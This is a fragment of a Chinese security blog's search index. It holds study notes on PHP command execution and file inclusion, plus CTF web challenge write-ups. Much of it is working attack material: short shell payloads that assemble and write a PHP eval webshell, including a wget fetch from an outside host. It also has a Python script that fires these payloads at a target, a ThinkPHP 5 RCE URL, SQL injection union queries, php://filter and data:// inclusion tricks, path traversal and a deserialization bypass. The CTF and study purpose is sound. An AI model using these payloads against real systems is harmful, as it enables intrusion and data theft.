","date":"2021-03-23","objectID":"/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:3:0","tags":["Web安全","CTF"],"title":"安全牛代码/命令执行学习笔记","uri":"/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x03 可控字符串长度受限情况下Getshell ","date":"2021-03-23","objectID":"/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:4:0","tags":["Web安全","CTF"],"title":"安全牛代码/命令执行学习笔记","uri":"/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"15个字符 wget a.cn/1-\u003emv 1 1.php echo \\\u003c?php \u003e1-\u003eecho eval\\(\u003e\u003e1-\u003eecho \\$_GET\u003e\u003e1-\u003e echo \\[1\\]\u003e\u003e1-\u003e \u003ccode\u003eecho \\)\\;\u003e\u003e1-\u003e mv 1 1.php ","date":"2021-03-23","objectID":"/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:4:1","tags":["Web安全","CTF"],"title":"安全牛代码/命令执行学习笔记","uri":"/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"7个字符 预备知识，参考https://www.freesion.com/article/7875567520/ \u003ea #虽然没有输入但是会创建a这个文件\rls -t #ls基于基于事件排序（从晚到早）\rsh a #sh会把a里面的每行内容当作命令来执行\r使用|进行命令拼接 #l\\ s = ls\rbase64 #使用base64编码避免特殊字符\r\u003c?php eval($_GET[1]);进行base64加密，需要被执行的语句：echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d\u003e1.php payload: \u003ehp\r\u003e1.p\\\\\r\u003ed\\\u003e\\\\\r\u003e\\ -\\\\\r\u003ee64\\\\\r\u003ebas\\\\\r\u003e7\\|\\\\\r\u003eXSk\\\\\r\u003eFsx\\\\\r\u003edFV\\\\\r\u003ekX0\\\\\r\u003ebCg\\\\\r\u003eXZh\\\\\r\u003eAgZ\\\\\r\u003ewaH\\\\\r\u003ePD9\\\\\r\u003eo\\ \\\\\r\u003eech\\\\\rls -t\u003e0\rsh 0\r脚本代码： import requests url = \"http://192.168.61.157/rce.php?1={0}\" print(\"[+]start attack!!!\") with open(\"payload.txt\",\"r\") as f: for i in f: print(\"[*]\" + url.format(i.strip())) requests.get(url.format(i.strip())) #检查是否攻击成功 test = requests.get(\"http://192.168.61.157/1.php\") if test.status_code == requests.codes.ok: print(\"[*]Attack success!!!\") ","date":"2021-03-23","objectID":"/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:4:2","tags":["Web安全","CTF"],"title":"安全牛代码/命令执行学习笔记","uri":"/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"5个字符 解决ls -t\u003e0，a在排序在l前符号后，可以使用下面的方法拆分。 \u003els\\\\\rls\u003ea\r\u003e\\ \\\\\r\u003e-t\\\\\r\u003e\\\u003e0\rls\u003e\u003ea\r参考：https://www.freesion.com/article/8743881775/、https://www.freesion.com/article/49311037498/ 输入通配符 * ，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数 \u003eid\r\u003eroot\r* （等同于命令：id root）\r增加字母来限定被用来当作命令和参数的文件 \u003els\r\u003elss\r\u003elsss\r\u003e1\r*s (等同于命令：ls lss lsss)\r*使第一个列出的文件名（ls）当作命令，剩下的文件名当作参数，而*后面的s有限制了只有含有s的字符串才能当做参数\r通过rev来倒置输出内容（rev命令将文件中的每行内容以字符为单位反序输出） \u003erev\recho 1234 \u003e v\r*v （等同于命令：rev v）\rIFS来代替空格，有时候一条命令中可能要有多个空格，而这样的话用上面的方法拼接命令是就会生成相同名的文件（空格），会造成覆盖，所以要用‘{IFS}`等符号来代替一个空格。 将创建的文件可以排成理想的顺序 思路1：(存在局限性，环境不一样，结果可能不一样，\\长度只能算1) # ls ‐t\u003eq\r\u003e-t\\\\\r\u003e\\\u003eq\r\u003el\\\\\r\u003es\\ \\\\\rls\u003ea\rls\u003e\u003ea\rls\u003ea之后文件内容为 在ls»a 得到的结果为 思路2： 用dir来代替ls不换行输出；rev将文件内容反向输出，目的是将ls ‐th \u003ef写入文件，-h选项的意思是生成的结果有利于人看，也就是不是用默认的byte做单位，而是根据实际情况调整。h的存在只为了能够利用字典顺序，即f在ht-前，ht-在sl前，这就按照字母顺序写入了v，v再反向输出一下就得到了ls ‐th \u003ef。 \u003edir\r\u003ef\\\u003e\r\u003eht-\r\u003esl\r*\u003ev (等同于命令：dir \"f\u003e\" \"ht‐\" \"sl\" \u003e v ，先将反向命令的写入中间文件v，文件v中的内容为f\u003e ht- sl （dir写入文件自动加空格，所以不需要在用“\\”来转义空格了））\r\u003erev\r\u003e*v\u003ea (等同于命令：rev v \u003e a)(a里面的内容为:ls ‐th \u003ef)\r后期再传入攻击payload或执行其他命令时，通过sh执行a文件即可生成f文件，得到的f文件里就是我们想要执行的命令或木马。反弹shell和上传Webshell马可参考链接。 ","date":"2021-03-23","objectID":"/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:4:3","tags":["Web安全","CTF"],"title":"安全牛代码/命令执行学习笔记","uri":"/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"4个字符 思路与上面的相似。 \u003edir \u003ef\\\u003e \u003eht- \u003esl *\u003ev (等同于命令：dir \"f\u003e\" \"ht‐\" \"sl\" \u003e v ，先将反向命令的写入中间文件v，文件v中的内容为f\u003e ht- sl （dir写入文件自动加空格，所以不需要在用“\\”来转义空格了）） \u003erev \u003e*v\u003ea (等同于命令：rev v \u003e a)(a里面的内容为:ls ‐th \u003ef) ","date":"2021-03-23","objectID":"/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:4:4","tags":["Web安全","CTF"],"title":"安全牛代码/命令执行学习笔记","uri":"/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x04 无数字字母的命令执行 将非字母、数字的字符经过各种变换，最后能构造出a-z中任意一个字符 异或 任何字母与0异或，最后得到的都是它本身。 \u003c?php $a = '~!@#$%^\u0026*()_+\\|/?.,\u003c\u003e`-={}[]'; for($i = 0;$i\u003cstrlen($a);$i++){ for($j = 0;$j\u003cstrlen($a);$j++){ if(ord($a[$i]^$a[$j])\u003e64 \u0026\u0026 ord($a[$i]^$a[$j])\u003c91){ echo $a[$i].'xor'.$a[$j].'is '; echo chr(ord($a[$i]^$a[$j])).' '; echo ord($a[$i]^$a[$j]); echo \"\\n\"; }elseif (ord($a[$i]^$a[$j])\u003e96 \u0026\u0026 ord($a[$i]^$a[$j])\u003c122){ echo $a[$i].'xor'.$a[$j].'is '; echo chr(ord($a[$i]^$a[$j])).' '; echo ord($a[$i]^$a[$j]); echo \"\\n\"; } } } ?\u003e 运行结果： ~xor$is Z 90\r~xor\u0026is X 88\r~xor*is T 84\r~xor(is V 86\r~xor)is W 87\r~xor+is U 85\r~xor/is Q 81\r~xor?is A 65\r~xor.is P 80\r~xor,is R 82\r~xor\u003cis B 66\r~xor-is S 83\r~xor=is C 67\r!xor@is a 97\r!xor`is A 65\r!xor{is Z 90\r@xor!is a 97\r@xor#is c 99\r@xor$is d 100\r@xor%is e 101\r@xor\u0026is f 102\r@xor*is j 106\r@xor(is h 104\r@xor)is i 105\r@xor+is k 107\r@xor/is o 111\r@xor.is n 110\r@xor,is l 108\r@xor-is m 109\r#xor@is c 99\r#xor`is C 67\r#xor{is X 88\r#xor[is x 120\r$xor~is Z 90\r$xor@is d 100\r$xor\\is x 120\r$xor|is X 88\r$xor`is D 68\r$xor}is Y 89\r$xor]is y 121\r%xor@is e 101\r%xor\\is y 121\r%xor|is Y 89\r%xor`is E 69\r%xor}is X 88\r%xor]is x 120\r^xor\u0026is x 120\r^xor*is t 116\r^xor(is v 118\r^xor)is w 119\r^xor+is u 117\r^xor/is q 113\r^xor?is a 97\r^xor.is p 112\r^xor,is r 114\r^xor\u003cis b 98\r^xor-is s 115\r^xor=is c 99\r\u0026xor~is X 88\r\u0026xor@is f 102\r\u0026xor^is x 120\r\u0026xor_is y 121\r\u0026xor|is Z 90\r\u0026xor`is F 70\r*xor~is T 84\r*xor@is j 106\r*xor^is t 116\r*xor_is u 117\r*xor\\is v 118\r*xor|is V 86\r*xor`is J 74\r*xor{is Q 81\r*xor}is W 87\r*xor[is q 113\r*xor]is w 119\r(xor~is V 86\r(xor@is h 104\r(xor^is v 118\r(xor_is w 119\r(xor\\is t 116\r(xor|is T 84\r(xor`is H 72\r(xor{is S 83\r(xor}is U 85\r(xor[is s 115\r(xor]is u 117\r)xor~is W 87\r)xor@is i 105\r)xor^is w 119\r)xor_is v 118\r)xor\\is u 117\r)xor|is U 85\r)xor`is I 73\r)xor{is R 82\r)xor}is T 84\r)xor[is r 114\r)xor]is t 116\r_xor\u0026is y 121\r_xor*is u 117\r_xor(is w 119\r_xor)is v 118\r_xor+is t 116\r_xor/is p 112\r_xor.is q 113\r_xor,is s 115\r_xor\u003cis c 99\r_xor\u003eis a 97\r_xor-is r 114\r_xor=is b 98\r+xor~is U 85\r+xor@is k 107\r+xor^is u 117\r+xor_is t 116\r+xor\\is w 119\r+xor|is W 87\r+xor`is K 75\r+xor{is P 80\r+xor}is V 86\r+xor[is p 112\r+xor]is v 118\r\\xor$is x 120\r\\xor%is y 121\r\\xor*is v 118\r\\xor(is t 116\r\\xor)is u 117\r\\xor+is w 119\r\\xor/is s 115\r\\xor?is c 99\r\\xor.is r 114\r\\xor,is p 112\r\\xor\u003eis b 98\r\\xor-is q 113\r\\xor=is a 97\r|xor$is X 88\r|xor%is Y 89\r|xor\u0026is Z 90\r|xor*is V 86\r|xor(is T 84\r|xor)is U 85\r|xor+is W 87\r|xor/is S 83\r|xor?is C 67\r|xor.is R 82\r|xor,is P 80\r|xor\u003eis B 66\r|xor-is Q 81\r|xor=is A 65\r/xor~is Q 81\r/xor@is o 111\r/xor^is q 113\r/xor_is p 112\r/xor\\is s 115\r/xor|is S 83\r/xor`is O 79\r/xor{is T 84\r/xor}is R 82\r/xor[is t 116\r/xor]is r 114\r?xor~is A 65\r?xor^is a 97\r?xor\\is c 99\r?xor|is C 67\r?xor{is D 68\r?xor}is B 66\r?xor[is d 100\r?xor]is b 98\r.xor~is P 80\r.xor@is n 110\r.xor^is p 112\r.xor_is q 113\r.xor\\is r 114\r.xor|is R 82\r.xor`is N 78\r.xor{is U 85\r.xor}is S 83\r.xor[is u 117\r.xor]is s 115\r,xor~is R 82\r,xor@is l 108\r,xor^is r 114\r,xor_is s 115\r,xor\\is p 112\r,xor|is P 80\r,xor`is L 76\r,xor{is W 87\r,xor}is Q 81\r,xor[is w 119\r,xor]is q 113\r\u003cxor~is B 66\r\u003cxor^is b 98\r\u003cxor_is c 99\r\u003cxor{is G 71\r\u003cxor}is A 65\r\u003cxor[is g 103\r\u003cxor]is a 97\r\u003exor_is a 97\r\u003exor\\is b 98\r\u003exor|is B 66\r\u003exor{is E 69\r\u003exor}is C 67\r\u003exor[is e 101\r\u003exor]is c 99\r`xor!is A 65\r`xor#is C 67\r`xor$is D 68\r`xor%is E 69\r`xor\u0026is F 70\r`xor*is J 74\r`xor(is H 72\r`xor)is I 73\r`xor+is K 75\r`xor/is O 79\r`xor.is N 78\r`xor,is L 76\r`xor-is M 77\r-xor~is S 83\r-xor@is m 109\r-xor^is s 115\r-xor_is r 114\r-xor\\is q 113\r-xor|is Q 81\r-xor`is M 77\r-xor{is V 86\r-xor}is P 80\r-xor[is v 118\r-xor]is p 112\r=xor~is C 67\r=xor^is c 99\r=xor_is b 98\r=xor\\is a 97\r=xor|is A 65\r=xor{is F 70\r=xor[is f 102\r{xor!is Z 90\r{xor#is X 88\r{xor*is Q 81\r{xor(is S 83\r{xor)is R 82\r{xor+is P 80\r{xor/is T 84\r{xor?is D 68\r{xor.is U 85\r{xor,is W 87\r{xor\u003cis G 71\r{xor\u003eis E 69\r{xor-is V 86\r{xor=is F 70\r}xor$is Y 89\r}xor%is X 88\r}xor*is W 87\r}xor(is U 85\r}xor)is T 84\r}xor+is V 86\r}xor/is R 82\r}xor?is B 66\r}xor.is S 83\r}xor,is Q 81\r}xor\u003cis A 65\r}xor\u003eis C 67\r}xor-is P 80\r[xor#is ","date":"2021-03-23","objectID":"/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:5:0","tags":["Web安全","CTF"],"title":"安全牛代码/命令执行学习笔记","uri":"/2021-03-23-%E5%AE%89%E5%85%A8%E7%89%9B%E4%BB%A3%E7%A0%81-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["WriteUp"],"content":"0x00 baby_web 题目描述：想想初始页面是哪个 在url后面输入index.php，但跳转到1.php。打开网络，发现访问到过。 然后在响应头找到 ","date":"2021-03-17","objectID":"/2021-03-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87001-010/:1:0","tags":["Web安全","CTF"],"title":"攻防世界web高手篇（001-010）","uri":"/2021-03-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87001-010/"},{"categories":["WriteUp"],"content":"0x01 Training-WWW-Robots ","date":"2021-03-17","objectID":"/2021-03-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87001-010/:2:0","tags":["Web安全","CTF"],"title":"攻防世界web高手篇（001-010）","uri":"/2021-03-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87001-010/"},{"categories":["WriteUp"],"content":"0x02 php_rce 搜一下ThinkPHP V5的漏洞，参考：https://www.cnblogs.com/backlion/p/10106676.html 直接使用payload,http://111.200.241.244:62801/?s=index/think\\app/invokefunction\u0026function=call_user_func_array\u0026vars[0]=system\u0026vars[1][]=whoami，能够RCE。 http://111.200.241.244:62801/?s=index/think\\app/invokefunction\u0026function=call_user_func_array\u0026vars[0]=system\u0026vars[1][]=ls / http://111.200.241.244:62801/?s=index/think\\app/invokefunction\u0026function=call_user_func_array\u0026vars[0]=system\u0026vars[1][]=cat /flag ","date":"2021-03-17","objectID":"/2021-03-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87001-010/:3:0","tags":["Web安全","CTF"],"title":"攻防世界web高手篇（001-010）","uri":"/2021-03-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87001-010/"},{"categories":["WriteUp"],"content":"0x03 Web_php_include 阅读代码发现php://会被过滤，这里采用PHP://大写绕过。 修改POST内容为\u003c?php system(\"ls\");?\u003e http://111.200.241.244:64165/?page=PHP://filter/read=convert.base64-encode/resource=fl4gisisish3r3.php 得到PD9waHAKJGZsYWc9ImN0Zns4NzZhNWZjYS05NmM2LTRjYmQtOTA3NS00NmYwYzg5NDc1ZDJ9IjsKPz4K，decode后得到flag。 解法2：利用data://伪协议 使用方法:data://text/plain;base64,xxxx(base64编码后的数据) 将 \u003c?php system(\"cat fl4gisisish3r3.php\");?\u003e base64加密，得到PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik7Pz4= 执行后，查看源代码 ","date":"2021-03-17","objectID":"/2021-03-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87001-010/:4:0","tags":["Web安全","CTF"],"title":"攻防世界web高手篇（001-010）","uri":"/2021-03-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87001-010/"},{"categories":["WriteUp"],"content":"0x04 ics-06 题目描述：云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。 id只能输入数字，输入其它的参数也会变成数字，这里使用burpsuite的intruder来爆破一下。 访问url ","date":"2021-03-17","objectID":"/2021-03-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87001-010/:5:0","tags":["Web安全","CTF"],"title":"攻防世界web高手篇（001-010）","uri":"/2021-03-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87001-010/"},{"categories":["WriteUp"],"content":"0x05 warmup 阅读源代码，发现注释\u003c!--source.php--\u003e，进入url/source.php，页面显示 \u003c?php highlight_file(__FILE__); //打印代码 class emmm //定义emmm类 { public static function checkFile(\u0026$page) //将传入参数赋值给$page { $whitelist = [\"source\"=\u003e\"source.php\",\"hint\"=\u003e\"hint.php\"]; //申明白名单 if (! isset($page) || !is_string($page)) { //若$page变量不存在或存在非法字符 echo \"you can't see it\"; return false; //返回false } if (in_array($page, $whitelist)) { $page在数组中 return true; //返回true } $_page = mb_substr( $page, 0, mb_strpos($page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } //截取$page中？前部分，若没有截取整个$page $_page = urldecode($page); //url解码 $_page = mb_substr( $_page, 0, mb_strpos($_page . '?', '?') ); if (in_array($_page, $whitelist)) { return true; } echo \"you can't see it\"; return false; } } //-------------------------------------------------------------------------------------------------------------- if (! empty($_REQUEST['file']) \u0026\u0026 is_string($_REQUEST['file']) \u0026\u0026 emmm::checkFile($_REQUEST['file']) ) { include $_REQUEST['file']; exit; } else { echo \"\u003cbr\u003e\u003cimg src=\\\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\\" /\u003e\"; } ?\u003e mb_substr($str, $start, $length ) 函数根据 start 和 length 参数返回 str 中指定的部分。 mb_strpos ($haystack ,$needle )函数返回 needle 在别一个字符串中首次出现的位置。 hint.php存在一条提示 ?两次url编码后为%253f，由于不知道ffffllllaaaagggg文件的具体位置，依次增加../测试。最后，构造http://111.200.241.244:60376/?file=source.php%253f../../../../../ffffllllaaaagggg ","date":"2021-03-17","objectID":"/2021-03-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87001-010/:6:0","tags":["Web安全","CTF"],"title":"攻防世界web高手篇（001-010）","uri":"/2021-03-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87001-010/"},{"categories":["WriteUp"],"content":"0x06 NewsCenter 题目描述：如题目环境报错，稍等片刻刷新即可。（等待了1个小时多。。。。） 输入1' order by 3#，得知有三列。构造1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())# 爆破出表后，爆破字段1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='secret_table')# 最后，构造1' union select 1,2,(select group_concat(fl4g) from secret_table)# ","date":"2021-03-17","objectID":"/2021-03-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87001-010/:7:0","tags":["Web安全","CTF"],"title":"攻防世界web高手篇（001-010）","uri":"/2021-03-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87001-010/"},{"categories":["WriteUp"],"content":"0x07 NaNNaNNaNNaN-Batman 解压压缩包 目测是html文件，修改下后缀名。 把最后的eval修改成alert，阅读源码。 function $(){ var e=document.getElementById(\"c\").value; if(e.length==16) if(e.match(/^be0f23/)!=null) if(e.match(/233ac/)!=null) if(e.match(/e98aa$/)!=null) if(e.match(/c7be9/)!=null){ var t=[\"fl\",\"s_a\",\"i\",\"e}\"]; var n=[\"a\",\"_h0l\",\"n\"]; var r=[\"g{\",\"e\",\"_0\"]; var i=[\"it'\",\"_\",\"n\"]; var s=[t,n,r,i]; for(var o=0;o\u003c13;++o){ document.write(s[o%4][0]); s[o%4].splice(0,1)}}} document.write('\u003cinput id=\"c\"\u003e\u003cbutton onclick=$()\u003eOk\u003c/button\u003e');delete _ match的值应该是be0f233ac7be98aa，输入得到flag{it's_a_h0le_in_0ne}。也可以直接在控制台运行js代码。 ","date":"2021-03-17","objectID":"/2021-03-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87001-010/:8:0","tags":["Web安全","CTF"],"title":"攻防世界web高手篇（001-010）","uri":"/2021-03-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87001-010/"},{"categories":["WriteUp"],"content":"0x08 PHP2 .phps：phps文件就是php的源代码文件。通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。 我们访问阅读一下源代码 \u003c?php if(\"admin\"===$_GET[id]) { echo(\"\u003cp\u003enot allowed!\u003c/p\u003e\"); exit(); } $_GET[id] = urldecode($_GET[id]); if($_GET[id] == \"admin\") { echo \"\u003cp\u003eAccess granted!\u003c/p\u003e\"; echo \"\u003cp\u003eKey: xxxxxxx \u003c/p\u003e\"; } ?\u003e 使用url二次编码绕过 ","date":"2021-03-17","objectID":"/2021-03-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87001-010/:9:0","tags":["Web安全","CTF"],"title":"攻防世界web高手篇（001-010）","uri":"/2021-03-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87001-010/"},{"categories":["WriteUp"],"content":"0x09 unserialize3 __wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。实例化xctf类并对其使用序列化。 \u003c?php class xctf{ //定义一个名为xctf的类 public $flag = '111'; //定义一个公有的类属性$flag，值为111 public function __wakeup(){ //定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本 exit('bad requests'); } } $a = new xctf(); //使用new运算符来实例化该类（xctf）的对象为a echo(serialize($a)); //输出被序列化的对象（a） ?\u003e 运行结果O:4:\"xctf\":1:{s:4:\"flag\";s:3:\"111\";} 序列化返回的字符串格式： O:\u003clength\u003e:\"\u003cclass name\u003e\":\u003cn\u003e:{\u003cfield name 1\u003e\u003cfield value 1\u003e...\u003cfield name n\u003e\u003cfield value n\u003e} 利用__wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。修改属性值。构造http://111.200.241.244:65392/?code=O:4:\"xctf\":2:{s:4:\"flag\";s:3:\"111\";} ","date":"2021-03-17","objectID":"/2021-03-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87001-010/:10:0","tags":["Web安全","CTF"],"title":"攻防世界web高手篇（001-010）","uri":"/2021-03-17-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E9%AB%98%E6%89%8B%E7%AF%87001-010/"},{"categories":["学习","安全技术"],"content":"\r","date":"2021-03-12","objectID":"/2021-03-13-%E5%AE%89%E5%85%A8%E7%89%9B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:0:0","tags":["Web安全","CTF"],"title":"安全牛文件包含学习笔记","uri":"/2021-03-13-%E5%AE%89%E5%85%A8%E7%89%9B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x00 常见文件包含情况 相关函数： • include() 路径不存在时，发出警告，但继续执行后续代码 • include_once() 不会再次包含 • require() 路径不存在时，发出警告，不执行继续执行后续代码 • require_once() 不会再次包含 包含的时候，不一定是要去包含php文件（即非可执行的php文件），只要包含一块完整php代码即可，\u003c?php XXX ?\u003e 重点在于找到可控文件 allow_url_include This option allows the use of URL-aware fopen wrappers with the following functions: include, include_once, require, require_once. 伪协议 ","date":"2021-03-12","objectID":"/2021-03-13-%E5%AE%89%E5%85%A8%E7%89%9B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:1:0","tags":["Web安全","CTF"],"title":"安全牛文件包含学习笔记","uri":"/2021-03-13-%E5%AE%89%E5%85%A8%E7%89%9B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x01 Phar://和Zip:// PHAR (“Php ARchive”) 是PHP里类似于JAR的一种打包文件。 phar:// [压缩文件路径]#[压缩文件内的子文件名] zlib:// – bzip2:// – zip:// — 压缩流，更重要的是不需要指定后缀名，可修改为任意后缀：jpg png gif xxx 等等。 zip://[压缩文件路径]#[压缩文件内的子文件名],%23可替换#。 compress.zlib://file.gz compress.bzip2://file.bz2 zip://archive.zip#dir/file.txt ","date":"2021-03-12","objectID":"/2021-03-13-%E5%AE%89%E5%85%A8%E7%89%9B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/:2:0","tags":["Web安全","CTF"],"title":"安全牛文件包含学习笔记","uri":"/2021-03-13-%E5%AE%89%E5%85%A8%E7%89%9B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"categories":["学习","安全技术"],"content":"0x02 filter和input伪协议、日志文件、session php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。 php://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。 范例：php://filter/read=convert.base64-encode/resource=[文件名] 不要read也可以正常跑，但不标准 php://input 是个可以访问请求的原始数据的只读流。 在POST请求中访问POST的data部分，在enctype=\"multipart/form-data\" 的时候php://input 是无效的。 利用条件： 1、allow_url_include = On。 2、对 allow_url_fopen 不做要求。 字符串过滤器 作用 string.rot13 等同于str_rot13()，rot13变换 string.toupper 等同于strtoupper()，转大写字母 string.tolower 等同于strtolower()，转小写字母 string.strip_tags 等同于strip_tags()，去除html、PHP语言标签 转换过滤器 作用 convert.base64-encode \u0026 convert.base64-decode 等同于base64_encode()和base64_decode()，base64编码解码 convert.quoted-printable-encode \u0026 convert.quoted-printable-decode quoted-printable 字符串与 8-bit 字符串编码解码 压缩过滤器 作用 zlib.deflate \u0026 zlib.inflate 在本地文件系统中创建 gzip 兼容文件的方法，但不产生命令行工具如 gzip的头和尾信息。只是压缩和解压数据流中的有效载荷部分。 bzip2.compress \u0026 bzip2.decompress 同上，在本地文件系统中创建 bz2 兼容文件的方法。 加密过滤器 作用 mcrypt.* libmcrypt 对称加密算法 mdecrypt.* libmcrypt 对称解密算法 很多时候，web 服务器会将请求写入到日志文件中，比如说 apache。在用户发起请求时，会将请求写入 access.log，当发生错误时将错误写入 error.log。默认情况下，日志保存路径在 /var/log/apache2/。 PHP 默认生成的 Session 文件往往存放在 /tmp 目录下。存储路径在phpinfo的session.save_path。 